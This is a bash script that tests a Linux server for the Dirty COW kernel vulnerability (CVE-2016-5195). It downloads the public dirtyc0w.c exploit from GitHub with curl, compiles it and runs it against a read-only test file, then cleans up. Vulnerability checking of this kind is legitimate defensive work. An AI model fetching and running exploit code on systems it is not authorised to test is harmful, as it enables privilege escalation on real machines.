#!/bin/bash
 
echo -e "\e[32mTesting for Dirty COW (CVE-2016-5195) vulnerability...\e[0m";
 
if [[ $EUID -ne 0 ]]; then
   echo -e "\e[31mThis script must be run as root\e[0m"
else
    # Download the exploit
    curl -s https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c > dirtyc0w.c
 
    # Check our file downloaded
    if [ ! -f dirtyc0w.c ]; then
        echo -e "\e[31mUnable to download dirtyc0w.c from https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c.\e[0m"
    else 
        # Create a new temporary test file to test with
        echo ORIGINAL_STRING > dirtycow_test
        chmod 0404 dirtycow_test
 
        gcc -pthread dirtyc0w.c -o dirtyc0w
 
        ./dirtyc0w dirtycow_test EXPLOITABLE &>/dev/null
 
        if grep -q EXPLOITABLE "dirtycow_test"; 
        then
           echo -e "\e[31mYour server is expoitable by Dirty COW (CVE-2016-5195)\e[0m"
        else
            echo -e "\e[32mYou're safe, no dirty cows here!\e[0m"
        fi
 
        # Clean up junk
        rm -rf dirtycow_test dirtyc0w dirtyc0w.c
    fi
fi
